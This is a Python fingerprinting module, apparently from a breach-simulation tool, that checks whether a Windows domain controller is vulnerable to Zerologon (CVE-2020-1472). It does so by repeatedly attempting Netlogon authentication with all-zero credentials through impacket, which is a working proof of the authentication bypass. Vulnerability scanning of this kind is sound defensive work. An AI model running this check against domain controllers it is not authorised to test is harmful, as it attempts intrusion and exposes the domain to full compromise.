"""
Implementation from https://github.com/SecuraBV/CVE-2020-1472
"""

import logging

import nmb.NetBIOS
from impacket.dcerpc.v5 import epm, nrpc, transport

from infection_monkey.network.HostFinger import HostFinger

LOG = logging.getLogger(__name__)


class ZerologonFinger(HostFinger):
    # Class related consts
    MAX_ATTEMPTS = 2000
    _SCANNED_SERVICE = "NTLM (NT LAN Manager)"

    def get_host_fingerprint(self, host) -> bool:
        """
        Checks if the Windows Server is vulnerable to Zerologon.
        """

        dc_ip, dc_name, dc_handle = self._get_dc_details(host)

        if dc_name:  # if it is a Windows DC
            # Keep authenticating until successful.
            # Expected average number of attempts needed: 256.
            # Approximate time taken by 2000 attempts: 40 seconds.

            LOG.info('Performing Zerologon authentication attempts...')
            rpc_con = None
            for _ in range(0, self.MAX_ATTEMPTS):
                try:
                    rpc_con = self.try_zero_authenticate(dc_handle, dc_ip, dc_name)
                    if rpc_con is not None:
                        break
                except Exception as ex:
                    LOG.info(ex)
                    break

            self.init_service(host.services, self._SCANNED_SERVICE, '')

            if rpc_con:
                LOG.info('Success: Domain Controller can be fully compromised by a Zerologon attack.')
                host.services[self._SCANNED_SERVICE]['is_vulnerable'] = True
                return True
            else:
                LOG.info('Failure: Target is either patched or an unexpected error was encountered.')
                host.services[self._SCANNED_SERVICE]['is_vulnerable'] = False
                return False

        else:
            LOG.info('Error encountered; most likely not a Windows Domain Controller.')
            return False

    def _get_dc_details(self, host) -> (str, str, str):
        dc_ip = host.ip_addr
        dc_name = self._get_dc_name(dc_ip)
        dc_handle = '\\\\' + dc_name
        return dc_ip, dc_name, dc_handle

    def _get_dc_name(self, dc_ip: str) -> str:
        """
        Gets NetBIOS name of the Domain Controller (DC).
        """

        try:
            nb = nmb.NetBIOS.NetBIOS()
            name = nb.queryIPForName(ip=dc_ip)  # returns either a list of NetBIOS names or None
            return name[0] if name else ''
        except BaseException as ex:
            LOG.info(f'Exception: {ex}')

    def try_zero_authenticate(self, dc_handle: str, dc_ip: str, dc_name: str):
        # Connect to the DC's Netlogon service.
        rpc_con = self.connect_to_dc(dc_ip)

        # Use an all-zero challenge and credential.
        plaintext = b'\x00' * 8
        ciphertext = b'\x00' * 8

        # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
        flags = 0x212fffff

        # Send challenge and authentication request.
        nrpc.hNetrServerReqChallenge(
            rpc_con, dc_handle + '\x00', dc_name + '\x00', plaintext)

        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                rpc_con, dc_handle + '\x00', dc_name +
                '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                dc_name + '\x00', ciphertext, flags
            )

            # It worked!
            assert server_auth['ErrorCode'] == 0
            return rpc_con

        except nrpc.DCERPCSessionError as ex:
            if ex.get_error_code() == 0xc0000022:  # STATUS_ACCESS_DENIED error; if not this, probably some other issue.
                pass
            else:
                raise Exception(f'Unexpected error code: {ex.get_error_code()}.')

        except BaseException as ex:
            raise Exception(f'Unexpected error: {ex}.')

    def connect_to_dc(self, dc_ip: str) -> object:
        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
        return rpc_con
